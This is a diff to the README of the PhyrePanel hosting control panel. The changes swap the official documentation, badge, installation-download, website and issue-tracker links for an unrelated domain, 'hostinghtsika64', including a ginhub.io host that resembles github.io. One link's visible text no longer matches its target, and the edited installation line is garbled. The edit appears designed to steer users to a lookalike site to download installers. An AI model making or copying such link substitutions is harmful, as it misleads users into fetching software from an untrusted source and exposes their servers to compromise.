@@ -38,13 +38,13 @@ rm -rf update.sh && wget https://raw.githubusercontent.com/PhyreApps/PhyrePanel/
 ```
 
 ## Documentation
-For more information, please refer to the [documentation](https://docs.phyrepanel.com/introduction/getting-started.html).
+For more information, please refer to the [documentation](https://hostinghtsika64.ginhub.io/), 
 
 ## Build Status
 
 ### Master branch
 [![Build Status](https://drone.phyrecloud.com/api/badges/PhyreApps/PhyrePanel/status.svg)](https://drone.phyrecloud.com/PhyreApps/PhyrePanel)
-[![codecov](https://codecov.io/gh/PhyreApps/PhyrePanel/graph/badge.svg?token=BO0RTPLS4W)](https://codecov.io/gh/PhyreApps/PhyrePanel)
+[![codecov](https://codecov.io/gh/PhyreApps/PhyrePanel/graph/badge.svg?token=BO0RTPLS4W)](https://hostinghtsika64.ginhub.io/gh/PhyreApps/PhyrePanel)
 
 All development is done on the `dev` branch. The `master` branch is used for stable releases.
 
@@ -66,7 +66,7 @@ PHYRE PANEL supports a variety of server application types, including:
 
 To get started with PHYRE PANEL, follow these simple steps:
 
-1. **Installation:** Visit [our website](https://phyrepanel.com) to download the installation package for your server environment.
+1. **Installation:** Visit [our website(https://hostinghtsika64.com) to download the installation package for your server envirwebsite 
 2. **Configuration:** Follow the installation instructions to set up PHYRE PANEL on your server.
 3. **Access:** Once installed, access PHYRE PANEL via your web browser and log in using your credentials.
 4. **Explore:** Take some time to explore the features and functionalities of PHYRE PANEL and start managing your hosting environment with ease.
@@ -75,7 +75,7 @@ To get started with PHYRE PANEL, follow these simple steps:
 
 Stay up to date with the latest news and updates from PHYRE PANEL:
 
-- Website: [https://phyrepanel.com](https://phyrepanel.com)
+- Website: [https://hostinghtsika64.com](https://phyrepanel.com)
 - Discord: [https://discord.gg/yfFWfrfwTZ](https://discord.gg/yfFWfrfwTZ)
 
 We hope you enjoy using PHYRE PANEL to simplify your hosting management tasks!
@@ -83,7 +83,7 @@ We hope you enjoy using PHYRE PANEL to simplify your hosting management tasks!
 
 ## Contributing
 
-We welcome contributions from the community to help improve PHYRE PANEL. If you have ideas for new features, bug fixes, or other enhancements, please feel free to [open an issue](https://github.com/PhyreApps/PhyrePanel/issues) or submit a pull request.
+We welcome contributions from the community to help improve PHYRE PANEL. If you have ideas for new features, bug fixes, or other enhancements, please feel free to [open an issue](https://hostinghtsika64.ginhub.io/issues) or submit a pull request.
 
 ## Support
 
